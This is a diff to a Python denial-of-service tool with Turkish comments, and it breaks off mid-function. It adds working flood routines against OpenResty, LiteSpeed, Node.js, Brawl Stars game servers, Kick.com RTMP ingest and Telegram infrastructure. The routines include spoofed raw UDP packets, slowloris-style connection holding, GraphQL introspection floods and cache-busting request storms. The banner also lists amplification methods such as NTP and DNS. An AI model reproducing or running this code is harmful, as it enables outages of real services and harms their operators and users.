@@ -16,7 +16,13 @@ L7 Methods  : GET POST HEAD PPS NULL OVH STRESS COOKIES APACHE XMLRPC
               DYN GSB RHEX STOMP BOT SLOW AVB CFB BYPASS EVEN DOWNLOADER STATICHTTP
               CF_BYPASS RAPID_RESET TLS_SPOOF KILLER UAM_BYPASS
               WEBSOCKET_KILLER NGINX_KILLER WORDPRESS_KILLER
+              OPENRESTY_KILLER LITESPEED_KILLER NODEJS_KILLER
+              BRAWLSTARS_KILLER KICK_KILLER TELEGRAM_VOICE_KILLER
+              AWS_KILLER CLOUDFRONT_KILLER RPS_GOD_LEVEL
 L4 Methods  : UDP TCP SYN ICMP CPS CONNECTION VSE TS3 MCPE FIVEM DISCORD MEGA_UDP
+              SSHLOG_FLOOD FTP_KILLER
+POST tips   : argv[9]=base64(body)  argv[10]=path  (örn: /api/login)
+WSS desteği : wss://host:port/path  →  TLS+WS otomatik algılanır
 AMP Methods : RDP CLDAP MEM CHAR NTP DNS ARD (root + reflectors arg gerekir)
 
 Örnekler:
@@ -113,7 +119,8 @@ def guard(mx_cpu=80, mx_ram=75):
 # ── soket yardımcıları ─────────────────────────────────────────────────────────
 def mksock(host, port, tls=False, to=4):
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    s.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1)
+    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,  1)
     s.settimeout(to); s.connect((host, port))
     if tls:
         ctx=ssl.create_default_context()
@@ -197,10 +204,14 @@ class Target:
         u=urlparse(url if '://' in url else 'http://'+url)
         self.scheme=u.scheme or 'http'
         self.host=u.hostname or url
-        self.port=u.port or (443 if self.scheme=='https' else 80)
+        self.tls=self.scheme in ('https', 'wss')
+        self.port=u.port or (443 if self.scheme in ('https','wss') else 80)
         self.path=(u.path or '/')+('?'+u.query if u.query else '')
         self.auth=f'{self.host}:{self.port}'
-        self.tls=self.scheme=='https'
+        # ws/wss → HTTP Origin header 'http'/'https' kullanır
+        self.origin_scheme='https' if self.scheme in ('wss','https') else 'http'
+        try:    self.ip=socket.gethostbyname(self.host)
+        except: self.ip=self.host
 
     def spoof(self):
         sp=rip()
@@ -247,7 +258,7 @@ class Target:
         return (self.base('POST')+self.rh()+
                 f"Content-Type: {ct}\r\nContent-Length: {len(b)}\r\n"
                 f"X-Requested-With: XMLHttpRequest\r\n\r\n{b}").encode()
-    def conn(self, to=4): return mksock(self.host, self.port, self.tls, to)
+    def conn(self, to=4): return mksock(self.ip,   self.port, self.tls, to)
 
 # ══════════════════════════════════════════════════════════════════════════════
 # L7 METOTLARI
@@ -262,12 +273,22 @@ def w_GET(t, rpc):
                 if _stop.is_set() or not send(s,pl): break
             close(s)
 
+_POST_BODY = None   # main() tarafından ayarlanır; None ise random body
+_POST_PATH = None   # main() tarafından ayarlanır; None ise t.path
+
 def w_POST(t, rpc):
+    static_body = _POST_BODY
+    path        = _POST_PATH or t.path
     while not _stop.is_set():
         with suppress(Exception):
-            s=t.conn()
+            s = t.conn()
             for _ in range(rpc):
-                if _stop.is_set() or not send(s, t.POST()): break
+                if _stop.is_set(): break
+                b   = static_body if static_body is not None else f'{{"data":"{rstr(32)}","ts":{int(time.time())}}}'
+                req = (t.base('POST', p=path) + t.rh() +
+                       f"Content-Type: application/json\r\nContent-Length: {len(b)}\r\n"
+                       f"X-Requested-With: XMLHttpRequest\r\n\r\n{b}").encode()
+                if not send(s, req): break
             close(s)
 
 def w_HEAD(t, rpc):
@@ -1278,7 +1299,7 @@ def w_WEBSOCKET_KILLER(t, rpc):
                 f"Upgrade: websocket\r\n"
                 f"Sec-WebSocket-Key: {key}\r\n"
                 f"Sec-WebSocket-Version: 13\r\n"
-                f"Origin: {t.scheme}://{t.host}\r\n"
+                f"Origin: {t.origin_scheme}://{t.host}\r\n"
                 f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                 f"\r\n"
             ).encode()
@@ -1500,6 +1521,657 @@ def w_WORDPRESS_KILLER(t, rpc):
             with _lock: SENT[0] += rpc
             close(s)
 
+# ── OPENRESTY_KILLER ──────────────────────────────────────────────────────────
+def w_OPENRESTY_KILLER(t, rpc):
+    """
+    OpenResty (nginx+LuaJIT) çok-vektör L7 flood.
+
+    Teknik 1 — Lua shared dict thrash (35%):
+      Benzersiz path+query → ngx.shared.dict her istek miss → LuaJIT JIT kodu soğur.
+      Cache-Control: no-cache + Pragma: no-cache → proxy_cache bypass garantisi.
+
+    Teknik 2 — Sub-request amplifikasyon (30%):
+      /api/, /_/, /proxy/ gibi Lua ngx.location.capture tetikleyen path'lar.
+      Her dış istek Lua içinde 2-4 iç sub-request açar → CPU 2-4x çarpanı.
+
+    Teknik 3 — Header table flood (20%):
+      16 benzersiz X- header → ngx.req.get_headers() çıktısı büyür, her
+      Lua middleware O(n) iterasyon yapar; LuaJIT trace derleme eşiği aşılmaz.
+
+    Teknik 4 — HTTP/1.1 pipeline + Lua coroutine (15%):
+      Pipelined istekler → her biri ayrı Lua coroutine açar; ngx.sleep(0)
+      barrier yoksa worker thread işlem sırası bozulur → throughput düşer.
+    """
+    _SUB_PATHS = [
+        '/api/', '/api/v1/', '/api/v2/', '/api/check', '/api/health',
+        '/_/', '/_/health', '/_/ready', '/_/status',
+        '/proxy/', '/proxy/check', '/internal/', '/internal/health',
+        '/rpc/', '/rpc/ping', '/service/', '/service/status',
+    ]
+    while not _stop.is_set():
+        with suppress(Exception):
+            s   = t.conn(8)
+            role = rint(0, 9)
+
+            if role < 4:  # Lua shared dict thrash
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    bust = f"?_lua={rstr(12)}&ts={rint(0,9999999)}&v={rstr(4)}"
+                    hdrs = ''.join(f"X-Lua-{rstr(6).capitalize()}: {rstr(16)}\r\n" for _ in range(4))
+                    req  = (f"GET {t.path}{bust} HTTP/1.1\r\n"
+                            f"Host: {t.auth}\r\n"
+                            f"User-Agent: {rua()}\r\n"
+                            f"Cache-Control: no-cache, no-store\r\n"
+                            f"Pragma: no-cache\r\n"
+                            f"Accept: text/html,*/*;q=0.9\r\n"
+                            f"Accept-Encoding: gzip, deflate\r\n"
+                            f"Connection: keep-alive\r\n"
+                            + hdrs + "\r\n").encode()
+                    if not send(s, req): break
+
+            elif role < 7:  # Sub-request amplifikasyon
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    path = random.choice(_SUB_PATHS) + rstr(8)
+                    req  = (f"GET {path}?r={rstr(10)} HTTP/1.1\r\n"
+                            f"Host: {t.auth}\r\n"
+                            f"User-Agent: {rua()}\r\n"
+                            f"X-Real-IP: {rip()}\r\n"
+                            f"X-Forwarded-For: {rip()}\r\n"
+                            f"Accept: application/json,*/*\r\n"
+                            f"Cache-Control: no-cache\r\n"
+                            f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            elif role < 9:  # Header table flood (16 custom header)
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    hdrs = ''.join(f"X-{rstr(8).capitalize()}-{rstr(4).capitalize()}: {rstr(24)}\r\n"
+                                   for _ in range(16))
+                    req  = (f"GET {t.path}?h={rstr(8)} HTTP/1.1\r\n"
+                            f"Host: {t.auth}\r\n"
+                            f"User-Agent: {rua()}\r\n"
+                            f"Accept: */*\r\n"
+                            f"Connection: keep-alive\r\n"
+                            + hdrs + "\r\n").encode()
+                    if not send(s, req): break
+
+            else:  # HTTP/1.1 pipeline → Lua coroutine burst
+                req = (f"GET {t.path}?p={rstr(6)} HTTP/1.1\r\n"
+                       f"Host: {t.auth}\r\n"
+                       f"User-Agent: {rua()}\r\n"
+                       f"Accept: */*\r\n"
+                       f"Connection: keep-alive\r\n\r\n")
+                pipeline = req.encode() * rpc
+                send(s, pipeline)
+                with _lock: SENT[0] += rpc; BYTES[0] += len(pipeline)
+                close(s)
+                continue
+
+            close(s)
+
+
+# ── LITESPEED_KILLER ───────────────────────────────────────────────────────────
+def w_LITESPEED_KILLER(t, rpc):
+    """
+    LiteSpeed Web Server çok-vektör L7 flood.
+
+    Teknik 1 — LSCache purge + yeniden doğrulama döngüsü (35%):
+      X-LiteSpeed-Purge + ardından GET → cache worker invalidation + rebuild.
+      Her döngü sunucuyu tam içerik üretmeye zorlar; cache miss garantilidir.
+
+    Teknik 2 — LSAPI worker tüketimi (30%):
+      PHP/app endpoint'e eş zamanlı istek → her istek LSAPI worker process açar.
+      Max worker'a ulaşınca yeni istekler queue'da bekler → latency patlar.
+
+    Teknik 3 — Rewrite kural zinciri (20%):
+      Karmaşık path + çok sayıda query param → .htaccess PCRE rewrite engine
+      tüm kural setini baştan sona tarar; her regex ayrı eval maliyet taşır.
+
+    Teknik 4 — Cache conditional miss: Vary çeşitliliği (15%):
+      Accept-Language + Accept-Encoding kombinasyon rotasyonu → LiteSpeed cache
+      her varyant için ayrı nesne oluşturur; segment sayısı patlar, bellek dolar.
+    """
+    _LSAPI_PATHS = [
+        '/wp-login.php', '/wp-admin/admin-ajax.php', '/index.php',
+        '/checkout/', '/cart/', '/my-account/', '/register/',
+        '/api/index.php', '/app/index.php',
+    ]
+    _LANGS = ['en-US,en;q=0.9', 'tr-TR,tr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9',
+              'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9', 'ru-RU,ru;q=0.9', 'zh-CN,zh;q=0.9']
+    _ENCS  = ['gzip, deflate, br', 'gzip, deflate', 'br', 'gzip', 'deflate', 'identity', '*']
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            s    = t.conn(8)
+            role = rint(0, 9)
+
+            if role < 4:  # LSCache purge + GET döngüsü
+                url_path = t.path + f"?ls={rstr(10)}"
+                # Sahte PURGE
+                purge = (f"GET {url_path} HTTP/1.1\r\n"
+                         f"Host: {t.auth}\r\n"
+                         f"User-Agent: {rua()}\r\n"
+                         f"X-LiteSpeed-Purge: *\r\n"
+                         f"X-LiteSpeed-Tag: {rstr(8)}\r\n"
+                         f"Cache-Control: no-cache\r\n"
+                         f"Connection: keep-alive\r\n\r\n").encode()
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    bust = f"?ls={rstr(10)}&nocache={rint(0,9999999)}"
+                    get  = (f"GET {t.path}{bust} HTTP/1.1\r\n"
+                            f"Host: {t.auth}\r\n"
+                            f"User-Agent: {rua()}\r\n"
+                            f"Cache-Control: no-cache, no-store\r\n"
+                            f"Pragma: no-cache\r\n"
+                            f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, purge): break
+                    if not send(s, get):   break
+
+            elif role < 7:  # LSAPI worker tüketimi
+                lsapi_path = random.choice(_LSAPI_PATHS)
+                body = f"action=heartbeat&data={rstr(32)}&ts={rint(0,9999999)}"
+                req  = (f"POST {lsapi_path} HTTP/1.1\r\n"
+                        f"Host: {t.auth}\r\n"
+                        f"User-Agent: {rua()}\r\n"
+                        f"Content-Type: application/x-www-form-urlencoded\r\n"
+                        f"Content-Length: {len(body)}\r\n"
+                        f"Cache-Control: no-cache\r\n"
+                        f"Connection: keep-alive\r\n\r\n"
+                        f"{body}").encode()
+                for _ in range(rpc):
+                    if _stop.is_set() or not send(s, req): break
+
+            elif role < 9:  # Rewrite kural zinciri
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    segs  = '/'.join(rstr(rint(4,10)) for _ in range(rint(3,7)))
+                    qstr  = '&'.join(f"{rstr(5)}={rstr(8)}" for _ in range(rint(8,14)))
+                    req   = (f"GET /{segs}?{qstr} HTTP/1.1\r\n"
+                             f"Host: {t.auth}\r\n"
+                             f"User-Agent: {rua()}\r\n"
+                             f"Accept: text/html,*/*\r\n"
+                             f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            else:  # Vary çeşitliliği — cache segment patlaması
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    req = (f"GET {t.path}?v={rstr(8)} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"User-Agent: {rua()}\r\n"
+                           f"Accept-Language: {random.choice(_LANGS)}\r\n"
+                           f"Accept-Encoding: {random.choice(_ENCS)}\r\n"
+                           f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
+                           f"Cache-Control: max-age=0\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            close(s)
+
+
+# ── NODEJS_KILLER ─────────────────────────────────────────────────────────────
+def w_NODEJS_KILLER(t, rpc):
+    """
+    Node.js / Express / Next.js çok-vektör L7 flood.
+
+    Teknik 1 — Event loop tıkama: büyük JSON POST (30%):
+      Content-Length: 256-512 KB JSON → V8 JSON.parse senkron çalışır,
+      event loop o süre boyunca başka I/O işleyemez → tüm bağlantılar gecikir.
+
+    Teknik 2 — GraphQL introspection flood (25%):
+      __schema + __type iç içe sorgu → resolver zinciri tüm type'ları dolaşır.
+      Her sorgu O(schema_size²) işlem; async executor kuyruğu dolar.
+
+    Teknik 3 — SSE / long-poll bağlantı tüketimi (25%):
+      /events, /api/stream, /sse endpoint handshake + bağlantıyı açık tut.
+      Her SSE bağlantısı: EventEmitter + timer + libuv handle → bellek leak.
+
+    Teknik 4 — Chunked slowloris POST (20%):
+      Content-Length: 50-200 MB beyan edilip gövde gönderilmez.
+      Express body-parser / raw-body buffer'da bekler; default requestTimeout
+      dolana kadar (60-120s) worker slot meşgul kalır.
+    """
+    _GQL_PATHS = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/query']
+    _SSE_PATHS = ['/events', '/api/events', '/sse', '/api/stream', '/api/sse',
+                  '/stream', '/realtime', '/api/realtime', '/updates', '/api/updates',
+                  '/api/live', '/_next/webpack-hmr', '/api/notifications']
+    _API_PATHS = ['/api/', '/api/v1/', '/api/v2/', '/api/data', '/api/users',
+                  '/api/products', '/api/search', '/_next/data/', '/trpc/']
+
+    _GQL_INTROSPECT = ('{"query":"{__schema{queryType{name}types{name kind fields{'
+                       'name type{name kind ofType{name kind}}}}}}"}')
+    _GQL_TYPE       = ('{"query":"{__type(name:\\"' + rstr(6) + '\\"){name fields{'
+                       'name type{name kind ofType{name kind ofType{name kind}}}}}}"}')
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            s    = t.conn(10)
+            role = rint(0, 9)
+
+            if role < 3:  # Büyük JSON POST → V8 JSON.parse event loop block
+                api_path = random.choice(_API_PATHS) + rstr(6)
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    # 256 KB - 512 KB arası JSON body
+                    sz     = rint(262144, 524288)
+                    fields = ','.join(f'"{rstr(8)}":"{rstr(rint(32,128))}"'
+                                      for _ in range(sz // 160))
+                    body   = '{' + fields + '}'
+                    req    = (f"POST {api_path} HTTP/1.1\r\n"
+                              f"Host: {t.auth}\r\n"
+                              f"User-Agent: {rua()}\r\n"
+                              f"Content-Type: application/json\r\n"
+                              f"Content-Length: {len(body)}\r\n"
+                              f"Accept: application/json\r\n"
+                              f"Connection: keep-alive\r\n\r\n"
+                              f"{body}").encode()
+                    if not send(s, req): break
+
+            elif role < 6:  # GraphQL introspection flood
+                gql_path = random.choice(_GQL_PATHS)
+                body     = random.choice([_GQL_INTROSPECT, _GQL_TYPE])
+                req      = (f"POST {gql_path} HTTP/1.1\r\n"
+                            f"Host: {t.auth}\r\n"
+                            f"User-Agent: {rua()}\r\n"
+                            f"Content-Type: application/json\r\n"
+                            f"Content-Length: {len(body)}\r\n"
+                            f"Accept: application/json\r\n"
+                            f"Connection: keep-alive\r\n\r\n"
+                            f"{body}").encode()
+                for _ in range(rpc):
+                    if _stop.is_set() or not send(s, req): break
+
+            elif role < 9:  # SSE / long-poll bağlantı tüketimi
+                sse_path = random.choice(_SSE_PATHS)
+                handshake = (f"GET {sse_path} HTTP/1.1\r\n"
+                             f"Host: {t.auth}\r\n"
+                             f"User-Agent: {rua()}\r\n"
+                             f"Accept: text/event-stream\r\n"
+                             f"Cache-Control: no-cache\r\n"
+                             f"Connection: keep-alive\r\n"
+                             f"Last-Event-ID: {rint(0, 999999)}\r\n\r\n").encode()
+                send(s, handshake)
+                with _lock: SENT[0] += 1
+                # SSE bağlantısını rpc*3 saniye aç tut → libuv handle leak
+                for _ in range(rpc * 3):
+                    if _stop.is_set(): break
+                    time.sleep(1)
+                    try: s.recv(256)
+                    except: break
+
+            else:  # Chunked slowloris POST → body-parser buffer wait
+                cl  = rint(50_000_000, 200_000_000)
+                req = (f"POST {t.path} HTTP/1.1\r\n"
+                       f"Host: {t.auth}\r\n"
+                       f"User-Agent: {rua()}\r\n"
+                       f"Content-Type: application/json\r\n"
+                       f"Content-Length: {cl}\r\n"
+                       f"Connection: keep-alive\r\n\r\n").encode()
+                send(s, req)
+                for _ in range(rpc * 4):
+                    if _stop.is_set(): break
+                    time.sleep(2)
+                    if not send(s, b'{"x":'): break
+                with _lock: SENT[0] += 1
+
+            close(s)
+
+
+# ── BRAWLSTARS_KILLER ─────────────────────────────────────────────────────────
+def w_BRAWLSTARS_KILLER(t, rpc):
+    """
+    Brawl Stars (Supercell) oyun sunucusu UDP protokol flood.
+    Hedef: ip:9339 (game server UDP port).
+
+    Supercell binary protokol: [2B msg_type][3B payload_len][2B version][payload]
+
+    Teknik 1 — ClientHello burst (40%):
+      Tip 10100 — sunucu her yeni kaynak IP/port için crypto context açar,
+      DH anahtar değişimi başlatır → CPU + bellek yükü.
+
+    Teknik 2 — Login flood (35%):
+      Tip 10101 — sahte uid + token hash → auth servis yükü, negatif DB sorgusu.
+
+    Teknik 3 — KeepAlive + SessionResume karışımı (15%):
+      Tip 10108 / 10113 — var olmayan session tablosu araması.
+
+    Teknik 4 — Büyük payload scatter (10%):
+      Tip 10100 + 1024 B random payload → fragment buffer baskısı.
+
+    Root varsa: IP spoof ile raw UDP; root yoksa: normal UDP (hızlı, çalışır).
+    """
+    _HELLO  = 10100   # 0x2774  client hello
+    _LOGIN  = 10101   # 0x2775  login request
+    _KALIVE = 10108   # 0x277C  keep alive
+    _RESUME = 10113   # 0x2781  session resume
+
+    def _pkt(msg_type, payload=b''):
+        return (struct.pack('>H', msg_type)
+                + len(payload).to_bytes(3, 'big')
+                + struct.pack('>H', 1)
+                + payload)
+
+    def _hello():
+        p  = struct.pack('>I', 5)          # protocol version
+        p += struct.pack('>I', 1)          # key version
+        p += os.urandom(32)                # content hash (random → cache miss her seferinde)
+        p += struct.pack('>I', rint(1,99)) # major
+        p += struct.pack('>I', rint(0,9))  # minor
+        p += os.urandom(8)
+        return _pkt(_HELLO, p)
+
+    def _login():
+        p  = struct.pack('>Q', random.randint(1, 0xFFFFFFFF))  # user id
+        p += struct.pack('>I', random.randint(1, 0xFFFF))      # token len hint
+        p += os.urandom(20)                                    # token hash
+        p += struct.pack('>I', 0)                              # locale
+        return _pkt(_LOGIN, p)
+
+    def _keepalive(): return _pkt(_KALIVE, b'')
+    def _resume():    return _pkt(_RESUME, os.urandom(16))
+    def _scatter():   return _pkt(_HELLO,  os.urandom(rint(256, 1024)))
+
+    host  = t.host
+    tport = t.port if t.port not in (80, 443) else 9339
+    try:    ip = socket.gethostbyname(host)
+    except: ip = host
+
+    has_root = (os.name != 'nt' and os.geteuid() == 0)
+    if has_root:
+        try:
+            rs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+            rs.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            with suppress(Exception):
+                while not _stop.is_set():
+                    role = rint(0, 9)
+                    if   role < 4: pkt = _hello()
+                    elif role < 7: pkt = _login()
+                    elif role < 9: pkt = _keepalive()
+                    else:          pkt = _scatter()
+                    # UDP + IP header ile spoof
+                    sip  = rip()
+                    sprt = rint(1024, 65535)
+                    udp  = struct.pack('>HHH', sprt, tport, 8 + len(pkt)) + b'\x00\x00' + pkt
+                    # checksum hesabı atlanır (kernel IPPROTO_RAW'da doldurur)
+                    ip_hdr = (b'\x45\x00'
+                              + struct.pack('>H', 20 + len(udp))
+                              + os.urandom(2)
+                              + b'\x40\x00\x40\x11\x00\x00'
+                              + socket.inet_aton(sip)
+                              + socket.inet_aton(ip))
+                    sndto(rs, ip_hdr + udp, (ip, tport))
+            close(rs); return
+        except: pass
+
+    # Root yok: normal UDP
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
+    with suppress(Exception):
+        while not _stop.is_set():
+            role = rint(0, 9)
+            if   role < 4: pkt = _hello()
+            elif role < 7: pkt = _login()
+            elif role < 9: pkt = _keepalive()
+            else:          pkt = _scatter()
+            sndto(s, pkt, (ip, tport))
+    close(s)
+
+
+# ── KICK_KILLER ───────────────────────────────────────────────────────────────
+def w_KICK_KILLER(t, rpc):
+    """
+    Kick.com RTMP ingest sunucusu protokol flood.
+    Hedef: ip:1935 (RTMP ingest port).
+
+    RTMP el sıkışması: C0(1B ver=3) + C1(1536B) → S0+S1+S2(3073B) → C2(1536B)
+    Sonra: AMF0 connect + createStream + publish → worker tahsisi + auth yükü.
+
+    Teknik 1 — Tam handshake + connect + bağlantı tut (40%):
+      Sunucu AMF0 parse eder, session açar; rpc*0.5s bağlantı tutulur →
+      RTMP worker/thread tüketimi; yeni stream publisher bağlanamaz.
+
+    Teknik 2 — Handshake + sahte stream key publish (30%):
+      connect + createStream + publish rastgele key ile gönderilir →
+      stream auth + kayıt tahsisi + ingest allocation yükü.
+
+    Teknik 3 — Yarım el sıkışma slot tüketimi (20%):
+      C0+C1 gönderilir, S yanıtı okunmaz, bağlantı açık tutulur →
+      RTMP acceptor thread bekleme listesi dolar.
+
+    Teknik 4 — Metadata flood (10%):
+      Geçerli handshake + @setDataFrame ile 32 rastgele alan içeren
+      dev metadata nesnesi gönderilir → AMF0 parse + heap yükü.
+    """
+
+    def _c0c1():
+        ts = struct.pack('>I', int(time.time()) & 0xFFFFFFFF)
+        return b'\x03' + ts + b'\x00\x00\x00\x00' + os.urandom(1528)
+
+    def _c2(s1):
+        # C2: S1'in timestamp + kendi timestamp + S1 random echo
+        return s1[:4] + struct.pack('>I', int(time.time()) & 0xFFFFFFFF) + s1[8:]
+
+    def _amf_str(v):
+        b = v.encode(); return b'\x02' + struct.pack('>H', len(b)) + b
+
+    def _amf_num(n):
+        return b'\x00' + struct.pack('>d', float(n))
+
+    def _chunk(msg_type, payload, csid=3, stream_id=0):
+        # Basic header: fmt=0
+        bh   = bytes([csid & 0x3F])
+        # Message header: timestamp(3) + length(3) + type(1) + stream_id(4 LE)
+        mh   = b'\x00\x00\x00' + len(payload).to_bytes(3, 'big') + bytes([msg_type])
+        mh  += struct.pack('<I', stream_id)
+        return bh + mh + payload
+
+    def _connect_cmd(app='live'):
+        body  = _amf_str('connect') + _amf_num(1) + b'\x05'
+        obj   = b'\x03'
+        obj  += b'\x00\x03app'   + _amf_str(app)
+        obj  += b'\x00\x05tcUrl' + _amf_str(f'rtmp://{host}/{app}')
+        obj  += b'\x00\x04type'  + _amf_str('nonprivate')
+        obj  += b'\x00\x00\x09'
+        return _chunk(0x14, body + obj)  # 0x14 = AMF0 command
+
+    def _publish_cmd(key):
+        cs  = _amf_str('createStream') + _amf_num(2) + b'\x05'
+        pub = _amf_str('publish') + _amf_num(3) + b'\x05' + _amf_str(key) + _amf_str('live')
+        return _chunk(0x14, cs) + _chunk(0x14, pub)
+
+    def _metadata_flood():
+        cmd  = _amf_str('@setDataFrame') + _amf_str('onMetaData')
+        arr  = b'\x08' + struct.pack('>I', 32)   # ECMA array, 32 items
+        for _ in range(32):
+            k = rstr(rint(4, 10)); v = rstr(rint(16, 48))
+            arr += struct.pack('>H', len(k)) + k.encode() + _amf_str(v)
+        arr += b'\x00\x00\x09'
+        return _chunk(0x12, cmd + arr)  # 0x12 = data message
+
+    def _recv_all(s, n, to=4):
+        buf = b''
+        dl  = time.time() + to
+        while len(buf) < n and time.time() < dl:
+            try:
+                c = s.recv(n - len(buf))
+                if not c: break
+                buf += c
+            except: break
+        return buf
+
+    host  = t.host
+    tport = t.port if t.port not in (80, 443) else 1935
+    try:    ip = socket.gethostbyname(host)
+    except: ip = host
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            role = rint(0, 9)
+
+            if role < 4:  # Tam handshake + connect + slot tut
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.settimeout(5)
+                try:
+                    s.connect((ip, tport))
+                    s.sendall(_c0c1()); SENT[0] += 1
+                    raw = _recv_all(s, 3073)
+                    if len(raw) >= 1537:
+                        s.sendall(_c2(raw[1:1537]))
+                        s.sendall(_connect_cmd())
+                        hold = max(1, rpc // 2)
+                        s.settimeout(hold + 1)
+                        deadline = time.time() + hold
+                        while not _stop.is_set() and time.time() < deadline:
+                            try: s.recv(256)
+                            except: break
+                finally: close(s)
+
+            elif role < 7:  # Handshake + sahte stream key publish
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.settimeout(5)
+                try:
+                    s.connect((ip, tport))
+                    s.sendall(_c0c1()); SENT[0] += 1
+                    raw = _recv_all(s, 3073)
+                    if len(raw) >= 1537:
+                        s.sendall(_c2(raw[1:1537]))
+                        s.sendall(_connect_cmd())
+                        s.sendall(_publish_cmd(rstr(20)))
+                        time.sleep(1)
+                finally: close(s)
+
+            elif role < 9:  # Yarım el sıkışma — acceptor slot tüket
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.settimeout(rpc * 0.3 + 2)
+                try:
+                    s.connect((ip, tport))
+                    s.sendall(_c0c1()); SENT[0] += 1
+                    time.sleep(max(1, rpc * 0.3))
+                finally: close(s)
+
+            else:  # Metadata flood
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.settimeout(5)
+                try:
+                    s.connect((ip, tport))
+                    s.sendall(_c0c1()); SENT[0] += 1
+                    raw = _recv_all(s, 3073)
+                    if len(raw) >= 1537:
+                        s.sendall(_c2(raw[1:1537]))
+                        s.sendall(_connect_cmd())
+                        for _ in range(rpc):
+                            if _stop.is_set(): break
+                            s.sendall(_metadata_flood())
+                finally: close(s)
+
+
+# ── TELEGRAM_VOICE_KILLER ─────────────────────────────────────────────────────
+def w_TELEGRAM_VOICE_KILLER(t, rpc):
+    """
+    Telegram ses/video çağrı infrastrüktürü çok-vektör L7 flood.
+
+    Teknik 1 — MTProto HTTPS transport tüketimi (35%):
+      /api POST → MTProto obfuscation header + rastgele yük; sunucu her
+      oturum için AES-256-IGE crypto context + DH anahtar türetimi yapar → CPU yükü.
+
+    Teknik 2 — Bot API long-poll tüketimi (30%):
+      /bot{fake_token}/getUpdates?timeout=30 → sahte token, 30s canlı bağlantı.
+      Sunucu her token için session tablosuna bakar + slot meşgul kalır.
+
+    Teknik 3 — Medya CDN flood: cache miss zinciri (20%):
+      cdn{1-5}.telegram.org/file/{random_hash} → her farklı hash cache miss,
+      disk I/O + bant genişliği basıncı; Range: bytes=0- tam dosya çekimini zorlar.
+
+    Teknik 4 — WebRTC sinyal kanalı tüketimi (15%):
+      WSS Upgrade handshake + bağlantı aç + WS PING frame'leri →
+      ses/video sinyal sunucusu bağlantı havuzunu tüketir.
+    """
+    _CDN_NODES = [f'cdn{i}.telegram.org' for i in range(1, 6)]
+    _WS_PATHS  = ['/ws', '/', '/wss', '/tgcalls', '/voip']
+
+    def _mtproto_payload():
+        h = bytearray(os.urandom(64))
+        if h[0] in (0xef, 0x44, 0x00, 0xff): h[0] = 0x7e
+        return bytes(h) + os.urandom(rint(32, 256))
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            s    = t.conn(10)
+            role = rint(0, 9)
+
+            if role < 4:  # MTProto HTTPS transport
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    body = _mtproto_payload()
+                    req  = (f"POST /api HTTP/1.1\r\n"
+                            f"Host: {t.auth}\r\n"
+                            f"User-Agent: TDLib/1.8.{rint(0,25)} TDAPI\r\n"
+                            f"Content-Type: application/x-www-form-urlencoded\r\n"
+                            f"Content-Length: {len(body)}\r\n"
+                            f"Connection: keep-alive\r\n\r\n").encode() + body
+                    if not send(s, req): break
+
+            elif role < 7:  # Bot API long-poll
+                fake_token = f"{rint(1000000000,9999999999)}:{rstr(35)}"
+                ep = random.choice([
+                    f'/bot{fake_token}/getUpdates?timeout=30&offset=-1',
+                    f'/bot{fake_token}/getUpdates?timeout=25',
+                    f'/bot{fake_token}/getMe',
+                    f'/bot{fake_token}/getWebhookInfo',
+                ])
+                req = (f"GET {ep} HTTP/1.1\r\n"
+                       f"Host: {t.auth}\r\n"
+                       f"User-Agent: python-telegram-bot/21.{rint(0,5)}\r\n"
+                       f"Accept: application/json\r\n"
+                       f"Connection: keep-alive\r\n\r\n").encode()
+                send(s, req)
+                with _lock: SENT[0] += 1
+                for _ in range(min(rpc * 3, 30)):
+                    if _stop.is_set(): break
+                    time.sleep(1)
+                    try: s.recv(256)
+                    except: break
+
+            elif role < 9:  # Medya CDN flood
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    cdn = random.choice(_CDN_NODES)
+                    fid = '/'.join([rstr(12), rstr(8), rstr(16)])
+                    req = (f"GET /file/{fid} HTTP/1.1\r\n"
+                           f"Host: {cdn}\r\n"
+                           f"User-Agent: Telegram/{rint(10,11)}.{rint(0,9)}.{rint(0,9)}\r\n"
